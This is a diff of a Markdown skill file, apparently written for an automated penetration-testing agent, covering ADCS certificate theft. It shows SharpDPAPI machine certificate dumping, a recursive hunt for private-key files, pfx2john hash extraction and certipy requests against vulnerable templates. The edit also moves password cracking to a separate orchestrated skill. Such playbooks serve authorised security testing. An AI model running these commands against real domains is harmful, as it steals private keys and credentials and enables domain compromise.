@@ -375,11 +375,14 @@ SharpDPAPI.exe certificates /machine
 # Search for certificate files
 Get-ChildItem -Recurse -Path C:\Users\ -Include *.pfx,*.p12,*.pkcs12,*.pem,*.key
 
-# Crack password-protected PFX
-pfx2john.py certificate.pfx > hash.txt
-john --wordlist=passwords.txt hash.txt
-hashcat -m 12400 hash.txt wordlist.txt
+# Extract hash from password-protected PFX for offline cracking
+pfx2john.py certificate.pfx > engagement/evidence/pfx-hash.txt
 ```
+
+**Do NOT crack hashes in this skill.** Save the PFX hash to
+`engagement/evidence/` and return to the orchestrator with the hash file path,
+hash type (PFX / hashcat mode 12400), and a routing recommendation to
+**credential-cracking**.
 
 ### THEFT5: UnPAC the Hash (NTLM from PKINIT)
 
@@ -463,7 +466,7 @@ issuance policy resolution.
 
 ```bash
 # Enumerate vulnerable templates (certipy shows OID links)
-certipy find -k -no-pass -dc-ip DC_IP -vulnerable
+certipy find -k -no-pass -dc-ip DC_IP -vulnerable -output engagement/evidence/certipy-adcs
 
 # Request certificate from template with OID group link
 certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
